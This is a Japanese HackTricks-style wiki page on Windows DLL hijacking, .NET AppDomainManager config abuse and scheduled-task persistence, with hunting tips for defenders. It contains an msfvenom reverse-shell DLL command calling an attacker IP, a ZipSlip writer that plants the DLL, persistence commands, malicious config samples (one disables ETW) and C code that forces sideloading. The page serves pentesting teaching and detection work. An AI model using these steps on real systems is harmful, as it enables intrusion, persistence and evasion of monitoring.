# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## 基本情報

DLL Hijacking は、信頼されたアプリケーションを操作して悪意のある DLL を読み込ませる手法です。この用語には、**DLL Spoofing、Injection、Side-Loading** などの手法が含まれます。主にコード実行や永続化の実現に利用され、権限昇格に使われることは比較的まれです。ここでは権限昇格に焦点を当てていますが、目的が異なっても hijacking の手法自体は同じです。

### 一般的な手法

DLL Hijacking には複数の手法があり、それぞれの有効性はアプリケーションの DLL 読み込み方法によって異なります:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: 正規の DLL を悪意のあるものに置き換える手法です。DLL Proxying を使って元の DLL の機能を維持することもできます。
2. **DLL Search Order Hijacking**: 正規の DLL よりも前に検索されるパスに悪意のある DLL を配置し、アプリケーションの検索順序を悪用する手法です。
3. **Phantom DLL Hijacking**: 存在しない必須 DLL だとアプリケーションに思い込ませ、読み込ませるための悪意のある DLL を作成する手法です。
4. **DLL Redirection**: `%PATH%` や `.exe.manifest` / `.exe.local` ファイルなどの検索パラメーターを変更し、アプリケーションを悪意のある DLL に誘導する手法です。
5. **WinSxS DLL Replacement**: WinSxS ディレクトリ内の正規 DLL を悪意のある DLL に置き換える手法で、DLL side-loading と関連することがよくあります。
6. **Relative Path DLL Hijacking**: コピーしたアプリケーションとともに、ユーザーが制御できるディレクトリに悪意のある DLL を配置する手法です。Binary Proxy Execution の手法に似ています。

アプリケーションが**独自の DLL loader**を実装している場合もあります。権限の高いプロセスが `Libraries` や `Plugins` などの子ディレクトリを列挙し、選択した DLL を helper に渡すことがあります。この処理は通常の Windows DLL 検索順序とは独立しています。別のアカウントがその正確なディレクトリにファイルを作成できる場合は、調査の手掛かりとして扱い、プロセスの実行ユーザー、ディレクトリに実際に適用される ACL、ファイル選択ルール、到達可能な読み込み処理を確認してください。実行ファイルの隣にあるディレクトリが書き込み可能でも、プロセスがそこから DLL を読み込むとは限りません。

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}

### インストール後の PE import grafting

従来の side-loading では、信頼された PE を変更せずに DLL 名の解決を乗っ取ります。一方、**import grafting** は、信頼されたプログラムによってすでに読み込まれる PE を変更します。攻撃者は、攻撃者が制御する DLL 用の import descriptor と、それに関連する lookup/IAT エントリーを追加します。Windows がその依存関係を再帰的に解決すると、追加された DLL がマップされ、その初期化コードが、ほかは正規のプロセス内で実行されます。これはディスク上の PE を変更する手法であり、実行時の hook として稼働中の IAT 関数ポインターを置き換える操作とは異なります。<sup>[[31]](#references)[[32]](#references)</sup>

変更対象の PE は、ユーザーや Task Scheduler が起動する実行ファイルではなく、中間に位置する vendor DLL の場合もあります。再利用可能な手順は次のとおりです:<sup>[[32]](#references)</sup>

1. 正規の実行ファイルとその依存関係を、攻撃者が制御するディレクトリにコピーします。
2. 依存関係の 1 つの import 構造を変更して悪意のある DLL を参照させつつ、その依存関係に期待される exports と通常の動作を維持します。
3. autorun または scheduled task を設定し、正規の実行ファイルを起動します。loader は変更された依存関係をマップした後、新たに import された DLL を読み込みます。タスクの列挙については、[Privilege Escalation with Autoruns](../privilege-escalation-with-autorun-binaries.md#scheduled-tasks) を参照してください。
4. `DllMain` では負荷の高い処理を行わないようにします。確認された loader は worker thread を作成し、そこで段階的な復号を続行しました。

vendor パッケージがクリーンで、import の変更がインストール後に行われた場合、これは vendor 側の supply-chain compromise とは異なります。staged directory 内のすべてのモジュールを調査し、host EXE だけに注目しないでください。依存関係の import list と hash を正常なインストール環境のものと比較し、署名を検証し、`C:\ProgramData` などの想定外の書き込み可能な場所から起動された vendor バイナリを調査してください。そのようなディレクトリにあるコピー済みの crash reporter や updater を指す scheduled task は、特に有用な調査の手掛かりです。<sup>[[32]](#references)</sup>


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

従来の DLL sideloading だけが、信頼された **.NET Framework** プロセスに攻撃者のコードを読み込ませる方法ではありません。対象の実行ファイルが**managed** アプリケーションの場合、CLR は実行ファイル名に基づく**アプリケーション構成ファイル**（例: `Setup.exe.config`）も参照します。このファイルでは、カスタム **AppDomainManager** を定義できます。設定ファイルが EXE の隣に配置された攻撃者の制御下にある assembly を指定すると、CLR は**アプリケーションの通常のコードパスより前に**それを読み込み、信頼されたプロセス内で実行します。<sup>[[24]](#references)</sup>

Microsoft の .NET Framework 構成スキーマによると、カスタム manager を使用するには `<appDomainManagerAssembly>` と `<appDomainManagerType>` の両方が必要です。<sup>[[16]](#references)[[17]](#references)</sup>

最小構成:

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
    <appDomainManagerType value="EvilMgr.Loader" />
  </runtime>
</configuration>
```

最小限のマネージャー:

```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
  [DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
  public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
    MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
  }
}
```

実践上の注意:
- これは **.NET Framework 固有**の手法です。Win32 DLL search order ではなく、CLR config parsing に依存します。
- ホストは実際に **managed EXE** である必要があります。簡易確認には `sigcheck -m target.exe`、`corflags target.exe` を使うか、PE metadata の **CLR Runtime Header** を確認します。
- config filename は実行ファイル名と完全に一致する必要があり（`<binary>.config`）、通常は **EXE の隣**に置かれます。
- 悪意ある managed assembly がプロセス内で実行される一方、信頼された EXE は変更されないため、**署名済みの Microsoft/vendor binary** で役立ちます。
- 書き込み可能な installer/update directory がすでにある場合、AppDomainManager hijacking を **第1段階**として使い、後続の段階で従来型の DLL sideloading や reflective loading を行えます。

### 構成ファイルの gadget としての署名済み AppDomainManager type

上記の一般的な AppDomainManager config hijack は、攻撃者の assembly を指定します。.NET Framework には別の手法として、ホストと同じ場所に配置するか、その他の方法で解決可能な **署名済み assembly** を使い、その manager type に攻撃者が制御するサイドカーデータを読み込ませる方法があります。攻撃者は引き続き、managed host の隣にある `.exe.config` と二次ファイルを制御する必要があります。選択した assembly に署名があっても、その構成入力が安全になるわけではありません。config の仕組みは既知の AppDomainManager の動作ですが、以下の署名済み type の連鎖は NetamLoader の分析で確認されたものです。<sup>[[16]](#references)[[17]](#references)[[35]](#references)</sup>

この連鎖では、構成によって `Microsoft.HostIntegration.Connectors` の `Microsoft.ApplicationServer.Caching.DataCacheFactoryConfiguration` が選択されます。その初期化処理は、アプリケーションディレクトリ内の `fabric.config` を探します。`customType` エントリは `System.Resources.ResXResourceSet` を指定し、コンストラクター引数として `Resources.resx` を渡すことで、攻撃者が作成した manager DLL を用意せずに resource parser に到達します。これには、AppFabric 関連の署名済み assembly と、指定された framework class がターゲット上で解決できることが必要です。これは、あらゆる managed EXE に共通する性質ではありません。<sup>[[35]](#references)</sup> また、構成された AppDomainManager を使うには、アプリケーションが full-trust である必要があります。そうでない場合、CLR は `TypeLoadException` をスローします。<sup>[[16]](#references)[[17]](#references)</sup>

```xml
<!-- in <host>.exe.config -->
<configuration>
  <runtime>
    <appDomainManagerType value="Microsoft.ApplicationServer.Caching.DataCacheFactoryConfiguration" />
    <appDomainManagerAssembly value="Microsoft.HostIntegration.Connectors, Version=1.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" />
  </runtime>
</configuration>
```

```xml
<!-- adjacent fabric.config -->
<section name="foo">
  <customType className="System.Resources.ResXResourceSet, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089(Resources.resx)" />
</section>
```

`Resources.resx` の内容は単なるデータファイルではなく、デシリアライズの sink です。[RESX to BinaryFormatter and XAML](../../../pentesting-web/deserialization/basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md#resx-resource-parsing-to-binaryformatter-and-xaml) を参照してください。報告された段階では、XAML loader はホストの**完全なコマンドラインを小文字化したもの**の SHA-256 hash から AES key を導出し、デコードした blob の先頭 16 bytes を IV として使っていました。そのため、異なるコマンドラインでファイルを再生すると、次の XAML が読み込まれる前に復号に失敗します。<sup>[[35]](#references)</sup>

### downloader + scheduled-task bootstrap としての AppDomainManager

実用的な侵入パターンでは、信頼された managed EXE と、**小さな bootstrapper** としてのみ動作する悪意のある `*.config` および AppDomainManager DLL を組み合わせます。<sup>[[25]](#references)</sup>

1. ユーザーが `%USERPROFILE%\Downloads` のようなもっともらしい場所から、署名済みの .NET installer または updater を起動する。
2. 隣接する config により、正規アプリのロジックが始まる**前に** CLR が攻撃者の assembly を読み込む。
3. 悪意のある manager が**パスゲート**を実行する（たとえば、ホスト EXE が `Downloads` から実行されている場合にのみ続行し、第 2 段階は `%LOCALAPPDATA%` からのみ実行する）。
4. チェックに合格すると、ユーザーが書き込み可能な `%LOCALAPPDATA%\PerfWatson2.exe` などのパスに実際の payload をダウンロードし、scheduled task を使って永続化する。

この亜種が重要な理由:
- 署名済みホスト EXE は変更されないため、メインバイナリの hash だけを調べるトリアージでは侵害を見逃す可能性があります。
- 単純な**パスベースの anti-analysis** はよく使われます。ZIP/EXE/DLL の 3 点セットを Desktop、Temp、または sandbox のパスに移動すると、意図的に一連の処理が失敗することがあります。
- 第 1 段階の AppDomainManager DLL は小さく、目立たないままにしておき、実際の implant は後から取得できます。

このパターンでよく見られる、最小限の永続化の例:

```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```

Notes:
- `/rl highest` は、そのユーザー／セッションで**利用可能な最高レベル**を意味します。それだけで SYSTEM への昇格が保証されるわけではありません。
- この手法は、従来型の DLL 検索順序を悪用した hijacking というより、**.NET config の悪用による実行／永続化**に分類する方が適切なことがよくあります。ただし、実行者は両者を組み合わせることがよくあります。

検出の手がかり:
- **ZIP 展開先**、`Downloads`、`%TEMP%`、その他のユーザーが書き込み可能なフォルダーから起動された署名済み .NET 実行ファイルと、同じ場所にある `<exe>.config`。
- アクションの実行先が `%LOCALAPPDATA%`、`%APPDATA%`、`Downloads` 配下で、名前がブラウザーやベンダーの updater を装った新しいスケジュールタスク。
- 別の EXE をすぐにダウンロードし、その後 `schtasks.exe` を起動する、短時間で終了する managed bootstrap プロセス。
- 実行ファイルのパスが想定されたユーザープロファイルのディレクトリと一致しない場合、早期に終了するサンプル。

### 既存のスケジュールタスクを hijack して sideload chain を再実行する

永続化を調べる際は、**新しいタスクの作成**だけに注目しないでください。一部の侵入グループは、正規のインストーラーが**通常の updater タスク**を作成するのを待ち、既存タスクの名前、作成者、トリガーを防御側に見慣れたままにして、タスクのアクションを書き換えます。

再利用可能なワークフロー:
1. 正規のソフトウェアをインストール／実行し、通常作成されるタスクを特定します。
2. タスク XML をエクスポートし、現在の `<Exec><Command>` / `<Arguments>` の値を記録します。<sup>[[23]](#references)</sup>
3. アクションだけを置き換え、ユーザーが書き込み可能なステージングディレクトリにある**信頼できるホスト EXE**をタスクで起動します。この EXE が、実際のペイロードを side-load または AppDomain-load します。
4. 新たに目立つ永続化アーティファクトを作成する代わりに、同じタスク名で再登録します。

```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```

なぜより隠密性が高いのか:
- タスク名は、ベンダーの updater など、正当なものに見せかけられます。
- **Task Scheduler service** が起動するため、親プロセスや祖先プロセスの検証では、`explorer.exe` ではなく、想定されるスケジュール実行のプロセスチェーンが確認されることがよくあります。
- **新しいタスク名**だけを探す DFIR チームは、登録済みのタスクのアクションが `%LOCALAPPDATA%`、`%APPDATA%`、または攻撃者が制御する別のパスを指すように変更されても、見逃す可能性があります。

迅速な調査の手がかり:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- `C:\Windows\System32\Tasks\*` の XML と `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` のメタデータをベースラインと比較します。
- **ユーザーが書き込み可能なディレクトリ**から実行する、または同じディレクトリにある `*.config` ファイルとともに .NET EXE を起動する、**ベンダー製に見える updater task** に対してアラートを設定します。

> [!TIP]
> HTML staging、AES-CTR configs、.NET implants を DLL sideloading に組み合わせる一連の手順については、以下のワークフローを参照してください。

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

### side-loaded stage を service のコマンドラインに紐付ける

side-loaded DLL が、想定される host EXE と DLL 名だけでなく、別の条件を要求する場合があります。Mandiant は、コマンドライン引数と host executable の名前に基づいて payload の復号を制御する loader について説明しています。<sup>[[33]](#references)</sup> 後の service を利用した一連の手法では、コピーした正規の host が、`LockClrVersion` をエクスポートする隣接の `mscoree.dll` をロードしました。この DLL は、service の引数と host executable のベース名から AES-128 key を導出した後にのみ、埋め込まれた stage を復号しました。各入力は 16 bytes に切り詰めるか、NUL でパディングされていました。byte 単位の key は `argument XOR embedded_key XOR executable_basename` で、その後、padding なしの AES-CBC で payload を復号しました。host の名前を変更するか、想定される引数なしで起動すると、DLL 自体はロードされても key が変わり、この stage は復号されません。この variant を再現または解析する際は、コマンドライン引数とベース名を正確に維持してください。<sup>[[34]](#references)</sup>

これは**通常の DLL side-loading に重ねられた payload gate**であり、新たな DLL 検索順序の規則でも、それ単体で privilege-escalation を実現する手法でもありません。最終的な権限レベルは service の security context によって決まります。[GitHub issue/file C2 workflow](../../../generic-methodologies-and-resources/github-issues-and-repository-files-c2.md) では、後続の transport を別途説明しています。<sup>[[34]](#references)</sup>

## 不足している DLL を見つける

システム内の不足している DLL を見つける一般的な方法は、sysinternals の [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) を実行し、**次の 2 つのフィルターを設定する**ことです。

![一般的な手法 - 不足している DLL を見つける: システム内の不足している DLL を見つける一般的な方法は、sysinternals の procmon を実行し、次の 2 つのフィルターを設定することです](<../../../images/image (961).png>)

![一般的な手法 - 不足している DLL を見つける: システム内の不足している DLL を見つける一般的な方法は、sysinternals の procmon を実行し、次の 2 つのフィルターを設定することです](<../../../images/image (230).png>)

そして、**File System Activity** のみを表示します。

![一般的な手法 - 不足している DLL を見つける: File System Activity のみを表示する](<../../../images/image (153).png>)

**不足している DLL を全般的に**探す場合は、これを**数秒間**実行したままにします。\
**特定の実行ファイル内の不足 DLL**を探す場合は、**"Process Name" "contains" `<exec name>`** のようなフィルターを追加して実行し、イベントのキャプチャを停止します。<sup>[[9]](#references)</sup>

## 不足している DLL を悪用する

privileges を昇格するには、**特権プロセスが書き込み可能な場所からロードしようとする DLL**を探します。正規の DLL が置かれているディレクトリより先に検索されるディレクトリを制御できる場合や、要求された DLL が存在せず、検索対象ディレクトリのいずれかに書き込める場合に、この状況が発生します。

### DLL 検索順序

**[Microsoft documentation](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) では、DLL がどのようにロードされるかを具体的に確認できます。**

**Windows applications** は、あらかじめ定義された検索パスを特定の順序でたどって DLL を探します。DLL hijacking は、悪意のある DLL をこれらのディレクトリのいずれかに配置し、正規の DLL より先にロードさせることで発生します。これを防ぐには、アプリケーションが必要な DLL を指定する際に絶対パスを使うようにします。

以下に**32-bit**システムでの **DLL search order** を示します。

1. アプリケーションをロードしたディレクトリ。
2. システムディレクトリ。このディレクトリのパスを取得するには、[**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) 関数を使います。(_C:\Windows\System32_)
3. 16-bit システムディレクトリ。このディレクトリのパスを取得する関数はありませんが、検索対象になります。(_C:\Windows\System_)
4. Windows ディレクトリ。このディレクトリのパスを取得するには、[**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) 関数を使います。
   1. (_C:\Windows_)
5. 現在のディレクトリ。
6. PATH 環境変数に列挙されたディレクトリ。**App Paths** レジストリキーで指定されたアプリケーションごとのパスは含まれないことに注意してください。DLL の検索パスを計算する際、**App Paths** キーは使用されません。

これは **SafeDllSearchMode** が有効な場合の**既定の**検索順序です。無効にすると、現在のディレクトリは 2 番目になります。この機能を無効にするには、**HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** レジストリ値を作成し、0 に設定します（既定では有効）。

[**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) 関数を **LOAD_WITH_ALTERED_SEARCH_PATH** を指定して呼び出すと、検索は **LoadLibraryEx** がロードする実行ファイルモジュールのディレクトリから始まります。

また、DLL は名前ではなく絶対パスを指定してロードできます。この場合、Windows は DLL 自体については指定されたパスだけを検索します。名前で要求された依存 DLL は、引き続き該当する検索順序に従います。

検索順序を変更する方法はほかにもありますが、ここでは説明しません。

### 任意のファイル書き込みを不足 DLL の hijack に連鎖させる

**関連する手法:** [oplock-gated mount-point switching against privileged remediation](../kernel-race-condition-object-manager-slowdown.md#applied-chain-oplock-gated-mount-point-switch-against-privileged-remediation).

1. **ProcMon** のフィルター（`Process Name` = 対象 EXE、`Path` ends with `.dll`、`Result` = `NAME NOT FOUND`）を使い、プロセスが検索したものの見つからなかった DLL 名を収集します。<sup>[[14]](#references)</sup>
2. バイナリが**スケジュール実行または service** で動作する場合、見つかった DLL 名のいずれかを**アプリケーションディレクトリ**（検索順序の項目 #1）に配置すれば、次回の実行時にロードされます。ある .NET scanner の例では、プロセスは本物の `hostfxr.dll` を `C:\Program Files\dotnet\fxr\...` からロードする前に、`C:\samples\app\` で探していました。
3. 任意の export を持つ payload DLL（例: reverse shell）を作成します: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. 使用する primitive が **ZipSlip 形式の任意書き込み**である場合は、展開先ディレクトリから抜け出して DLL がアプリケーションフォルダーに配置される ZIP を作成します:

```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
    z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```

5. アーカイブを監視対象の inbox/share に配置します。スケジュールされたタスクがプロセスを再起動すると、悪意のある DLL が読み込まれ、サービスアカウントとしてコードが実行されます。

### RTL_USER_PROCESS_PARAMETERS.DllPath による sideloading の強制

新しく作成するプロセスの DLL search path に確実に影響を与える高度な方法として、ntdll のネイティブ API を使ってプロセスを作成する際に、RTL_USER_PROCESS_PARAMETERS の DllPath フィールドを設定できます。ここに攻撃者が制御するディレクトリを指定すると、インポートする DLL を名前で解決する（絶対パスを使わず、安全な読み込みフラグも使わない）対象プロセスに、そのディレクトリ内の悪意のある DLL を強制的に読み込ませることができます。

主な考え方
- RtlCreateProcessParametersEx でプロセスパラメーターを構築し、制御下のフォルダー（例: dropper/unpacker があるディレクトリ）を指すカスタム DllPath を指定します。
- RtlCreateUserProcess でプロセスを作成します。対象バイナリが DLL を名前で解決すると、ローダーは解決時に指定された DllPath を参照するため、悪意のある DLL が対象 EXE と同じディレクトリに置かれていなくても、確実に sideloading できます。

注意点・制限
- これは作成される子プロセスに影響します。現在のプロセスにのみ影響する SetDllDirectory とは異なります。
- 対象が DLL を名前でインポートするか、LoadLibrary で読み込む必要があります（絶対パスを使わず、LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories も使わないこと）。
- KnownDLLs とハードコードされた絶対パスは hijack できません。転送された export や SxS によって優先順位が変わる場合があります。

最小限の C の例（ntdll、ワイド文字列、簡略化したエラー処理）:

<details>
<summary>完全な C の例: RTL_USER_PROCESS_PARAMETERS.DllPath による DLL sideloading の強制</summary>

```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
    PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    PUNICODE_STRING ImagePathName,
    PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrentDirectory,
    PUNICODE_STRING CommandLine,
    PVOID Environment,
    PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo,
    PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData,
    ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
    PUNICODE_STRING NtImagePathName,
    ULONG Attributes,
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
    PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
    HANDLE ParentProcess,
    BOOLEAN InheritHandles,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
    DWORD n = GetModuleFileNameW(h, out, cch);
    for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
    // Target Microsoft-signed, DLL-hijackable binary (example)
    const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

    // Build custom DllPath = directory of our current module (e.g., the unpacked archive)
    wchar_t dllDir[MAX_PATH];
    DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

    UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
    RtlInitUnicodeString(&uImage, image);
    RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
    RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
    RtlInitUnicodeString(&uCurDir, dllDir);

    RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
        (RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
    RtlCreateUserProcess_t pRtlCreateUserProcess =
        (RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

    RTL_USER_PROCESS_PARAMETERS *pp = NULL;
    NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
                                                NULL, NULL, NULL, NULL, NULL, 0);
    if (st < 0) return 1;

    RTL_USER_PROCESS_INFORMATION pi = {0};
    st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
    if (st < 0) return 1;

    // Resume main thread etc. if created suspended (not shown here)
    return 0;
}
```

</details>

運用上の使用例
- 必要な関数をエクスポートする、または本物の DLL にプロキシする悪意ある xmllite.dll を、DllPath ディレクトリに配置します。
- 上記の手法を使って xmllite.dll を名前で検索することが分かっている署名済みバイナリを起動します。ローダーは指定された DllPath 経由でインポートを解決し、DLL をサイドロードします。

この手法は、複数段階のサイドロードチェーンを実行するために実環境で使われていることが確認されています。最初のランチャーがヘルパー DLL をドロップし、それがカスタム DllPath を指定して、ハイジャック可能な Microsoft 署名済みバイナリを起動し、ステージングディレクトリから攻撃者の DLL を強制的にロードさせます。<sup>[[6]](#references)</sup>


### `.exe.config` 経由の .NET AppDomainManager hijacking

**.NET Framework** のターゲットでは、アプリケーションに隣接する **`.exe.config`** ファイルを悪用することで、メモリをパッチせずに **`Main()` より前に**サイドロードできます。Win32 の DLL 検索順序だけに頼るのではなく、攻撃者は正規の .NET EXE の隣に悪意ある config と、攻撃者が制御する 1 つ以上のアセンブリを配置します。

チェーンの仕組み:<sup>[[15]](#references)[[22]](#references)</sup>
1. ホスト EXE が起動し、**CLR が `<exe>.config` を読み込みます**。
2. config で **`<appDomainManagerAssembly>`** と **`<appDomainManagerType>`** を設定し、ランタイムに攻撃者が制御する `AppDomainManager` をインスタンス化させます。
3. 悪意ある manager は、信頼されたホストプロセス内で **`Main()` より前に実行**されます。
4. 同じ config により、CLR がローカルアセンブリ（例: `InitInstall.dll`、`Updater.dll`、`uevmonitor.dll`）を優先して解決するよう強制できます。また、インラインパッチを使わずにランタイムの検証やテレメトリを弱めることもできます。

キャンペーンで見られるパターン（正確な入れ子構造はディレクティブや CLR のバージョンによって異なる場合があります）:

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="Updater" />
    <appDomainManagerType value="MyAppDomainManager" />
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <probing privatePath="." />
      <publisherPolicy apply="no" />
    </assemblyBinding>
    <bypassTrustedAppStrongNames enabled="true" />
    <etwEnable enabled="false" />
  </runtime>
  <startup>
    <requiredRuntime version="v4.0.30319" safemode="true" />
  </startup>
</configuration>
```

有用な理由:
- **`<probing privatePath="."/>`** はアセンブリの解決先をアプリケーションディレクトリに限定し、このフォルダーを予測可能なsideloadingの対象にします。<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** はCLRの初期化中に実行を攻撃者のコードへ移し、正規のアプリケーションロジックが実行される前にコードを実行します。<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** により、full-trustアプリがstrong-name検証に失敗することなく、署名のないアセンブリや改ざんされたアセンブリを読み込める場合があります。<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** は、新しいアセンブリへのpublisher-policyリダイレクトを回避します。<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** により、runtimeの選択がより予測しやすくなります。<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** は特に注目に値します。implantがメモリ内の `EtwEventWrite` をpatchするのではなく、設定によって **CLR自身がETWでの可視性を無効化する** ためです。

近年のcampaignで見られる運用パターン:
- Stage 1で `setup.exe`、`setup.exe.config`、ローカルアセンブリを配置する。
- Stage 2でそれらを本物らしい **AppData update** フォルダーにコピーし、ホストを `update.exe` のような名前に変更して、**scheduled task** から再起動する。
- Stage 3で、最終的なRAT DLL/exportを読み込む前に実行コンテキスト（例: Task Schedulerから起動された想定どおりの親プロセス `svchost.exe`）を確認する。

調査のヒント:
- ユーザーが書き込み可能な場所で、不審な隣接 **`.config`** ファイルとともに実行される、署名済みまたはその他の正規の **.NET実行ファイル**。
- **`appDomainManagerAssembly`**、**`appDomainManagerType`**、**`probing privatePath="."`**、**`bypassTrustedAppStrongNames`**、または **`etwEnable enabled="false"`** を含む `.config` ファイル。
- **`%LOCALAPPDATA%`** またはアプリ固有の `\bin\update\` ディレクトリから名前を変更したupdateバイナリを再起動するscheduled task。
- scheduled taskが信頼された.NETホストを起動し、そのホストが直ちに自身のディレクトリからベンダー製ではないアセンブリを読み込む親子プロセスの連鎖。

#### Windowsのドキュメントに記載されているDLL検索順序の例外

Windowsのドキュメントには、標準のDLL検索順序に関する特定の例外が記載されています。

- **メモリにすでに読み込まれているDLLと同じ名前のDLL** が見つかった場合、システムは通常の検索を省略します。代わりに、リダイレクトとマニフェストを確認してから、メモリにあるDLLを使用します。**この場合、システムはDLLを検索しません**。
- DLLが現在のWindowsバージョンの **known DLL** として認識される場合、システムはそのknown DLLのバージョンと、それに依存するDLLを使用し、**検索処理を省略します**。レジストリキー **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** には、これらのknown DLLの一覧が格納されています。
- **DLLに依存関係がある場合**、依存DLLは、最初のDLLがフルパスで指定されていたかどうかにかかわらず、**モジュール名だけで指定された**ものとして検索されます。

### 権限昇格

**要件**:

- **異なる権限**（水平移動または横方向の移動）で動作中、または動作する予定で、**DLLが不足している**プロセスを特定する。
- **DLL** の検索対象となる **ディレクトリ** のいずれかに、**書き込みアクセス** があることを確認する。この場所は、実行ファイルのディレクトリやシステムパス内のディレクトリである場合があります。

これらの前提条件がデフォルトでそろうことはまれです。通常、特権実行ファイルにDLL依存関係の不足はなく、標準ユーザーは通常、システム検索パス内のディレクトリに書き込めません。ただし、設定に不備がある環境では、両方の条件が露呈する可能性があります。\
要件を満たす場合は、[UACME](https://github.com/hfiref0x/UACME)プロジェクトを確認してください。主な目的はUAC bypassですが、特定のWindowsバージョン向けのDLL-hijacking PoCが含まれており、見つけた書き込み可能なディレクトリに合わせて応用できることがよくあります。

フォルダーに対する自分の権限は、次の方法で **確認できます**。<sup>[[5]](#references)</sup>

```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```

また、**PATH 内のすべてのフォルダーのアクセス権を確認してください**:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

実行ファイルのインポートとdllのエクスポートも次の方法で確認できます。

```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```

System Path folderへの書き込み権限を利用して**DLL Hijackingで権限昇格する方法**の完全なガイドは、こちらを確認してください:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### 自動化ツール

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)は、system PATH内のフォルダに書き込み権限があるかを確認します。\
この脆弱性の発見に役立つその他の自動化ツールとして、**PowerSploit functions**の _Find-ProcessDLLHijack_、_Find-PathDLLHijack_、_Write-HijackDll_ があります。

### 例

